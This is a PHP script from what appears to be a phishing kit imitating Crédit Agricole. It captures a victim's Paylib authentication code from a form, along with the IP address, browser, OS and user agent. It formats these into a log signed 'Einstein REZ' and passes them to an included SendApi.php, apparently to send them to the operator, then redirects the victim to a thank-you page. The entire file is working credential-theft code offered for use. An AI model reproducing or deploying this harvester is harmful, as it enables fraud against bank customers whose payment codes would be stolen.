<?php
error_reporting(0);
session_start();

include("../detect.php"); 
$useragent = $_SERVER['HTTP_USER_AGENT'];
$brow = getBrowser() ;
$sys = getOs();
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;

$InfoDATE   = date("d-m-Y h:i:sa");

$paylib = $_SESSION['paylib'] = $_POST['paylib'];



$yagmai .= '
[💬 Code Paylib] = '.$_SESSION['paylib'].'
       [+]━━━━【💻 System】━━━[+]
[🔍 IP INFO] = http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'
[⏰ TIME/DATE] ='.$InfoDATE.'
[🌐 BROWSER] = '.$brow.' and '.$sys.'
[🔍 FINGERPRINT] = '.$useragent.'
';



$yagmail .= '
[+]━━━━━━━━━━━━━━━━━━【 Log Agricole 】━━━━━━━━━━━━━━━━━━━━[+]
[+]━━━━━━━━━━━━━━━━【💳 Auth INFO】━━━━━━━━━━━━━━━━━━━[+]
[💬 Code Paylib] = '.$_SESSION['paylib'].'
[+]━━━━━━━━━━━━━━━━━━【 End Log 】━━━━━━━━━━━━━━━━━━━━[+]
[+]━━━━━━━━━━━━━━【Einstein REZ🤡🖕】━━━━━━━━━━━━━━━[+]
';

include("SendApi.php"); 


header('Location: ../thanks.php');




?>